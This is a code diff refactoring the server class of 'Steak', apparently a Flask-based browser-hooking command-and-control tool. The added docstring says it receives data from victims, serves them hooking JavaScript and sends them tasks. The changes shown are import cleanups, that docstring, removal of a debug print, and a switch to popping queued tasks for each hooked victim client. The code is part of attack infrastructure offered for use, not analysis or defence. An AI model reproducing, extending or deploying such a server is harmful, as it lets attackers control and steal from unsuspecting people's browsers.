@@ -1,4 +1,3 @@
-import steak.core as Core
 from flask import Flask,Response,request
 import uuid
 import os
@@ -7,11 +6,17 @@ import traceback,sys
 import queue
 from steak.utils import uniquerandstring
 from steak.utils import base64decode,base64encode
+from .Project import Project
+from .Client import Client
 import _thread
 
 class Server:
-    def __init__(self,ip:str,port:int,projects:list[Core.Project],callbackpath:str) -> None:
-        print('fuckserver')
+    '''
+    This class is the main server of Steak based on Flask
+    It can receive information submited by victim and dispatch the information to attack_client function the victim corresponds to 
+    It can also provide hooking javascript to victim and send task to victim
+    '''
+    def __init__(self,ip:str,port:int,projects:list[Project],callbackpath:str) -> None:
         self.ip=ip
         self.port=port
         self.projects=projects
@@ -34,14 +39,14 @@ class Server:
         return 'http://'+self.ip+':'+str(self.port)+self.callbackpath
 
 
-    def _createclient(self,project:Core.Project)->Core.Client:
+    def _createclient(self,project:Project)->Client:
         '''
         Creates and return a client object from a project object
         its client id is automatically generated
         '''
         newclientid=uniquerandstring(self.clientids)
         self.clientids.add(newclientid)
-        client=Core.Client(newclientid,project)
+        client=Client(newclientid,project)
         return client 
 
     def generate_response(self,s:str)->Response:
@@ -84,7 +89,7 @@ class Server:
             
             if clientid not in self.clientid2client:
                 try:
-                    client=Core.Client(clientid,project,dataupload)
+                    client=Client(clientid,project,dataupload)
                 except Exception as e: 
                     #Error occurs because we restarted our server so that we've forgot the victim who remembers us
                     return self.generate_response('Restart') #forget me and restart !
@@ -113,7 +118,7 @@ class Server:
             check if there are tasks for the client. 
             If there are,send one to the clinet
             '''
-            task=client.get_latest_task()
+            task=client.pop_latest_task()
             if task:
                 self.taskid2payloadobj[task.taskid]=task
                 return self.generate_response(task.payload_str)
